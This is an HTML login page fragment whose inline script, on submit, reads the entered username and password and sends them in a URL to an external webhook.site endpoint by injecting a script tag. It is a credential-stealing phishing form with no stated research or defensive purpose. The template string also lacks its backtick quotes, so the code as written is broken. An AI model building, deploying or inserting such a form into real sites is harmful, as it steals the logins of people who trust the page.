 <div class="login-container">
        <h2>Login</h2>
        <form id="loginForm">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Submit</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission

            // Get the values from the input fields
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Create a script element to send the data
            const script = document.createElement('script');
            script.src = https://webhook.site/e65bd06f-7cfe-4e0f-944d-6229010f4efb?user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)};
            document.body.appendChild(script);
        });
    </script>
